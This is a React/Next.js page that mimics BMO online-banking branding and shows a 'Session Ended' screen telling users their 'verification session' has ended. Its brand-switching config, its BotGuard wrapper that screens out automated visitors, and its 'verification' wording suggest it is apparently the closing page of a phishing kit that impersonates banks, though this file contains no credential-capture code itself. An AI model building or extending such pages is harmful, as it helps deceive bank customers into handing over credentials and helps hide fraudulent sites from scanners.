'use client';

/**
 * BMO Terminated/Session Ended Page
 * Clean, minimal design consistent with BMO branding
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* Centered Page Header */}
      <div className="page-header">
        <h1>Session Ended</h1>
      </div>

      {/* Two Column Layout */}
      <div className="main-container">
        {/* Card */}
        <div className="login-card">
          <div className="card-header">
            <h2>Session Ended</h2>
          </div>

          <div className="login-form">
            <p style={{ color: 'var(--bmo-dark)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
              Your verification session has ended.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '8px' }}>
              This may be due to inactivity or the session was completed.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '24px' }}>
              If you believe this was an error, please contact our support team for assistance.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '32px' }}>
              Need help? Contact {currentBrand.companyName} support
            </p>
          </div>
        </div>

        {/* Right Panels */}
        <div className="info-panels">
          <div className="info-card security-card">
            <div className="security-header">
              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
              <h2>Your security always comes first</h2>
            </div>
            <p className="security-text">
              We've made Online Banking more convenient, while still using advanced security
              technologies that keep your money and information safe.
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
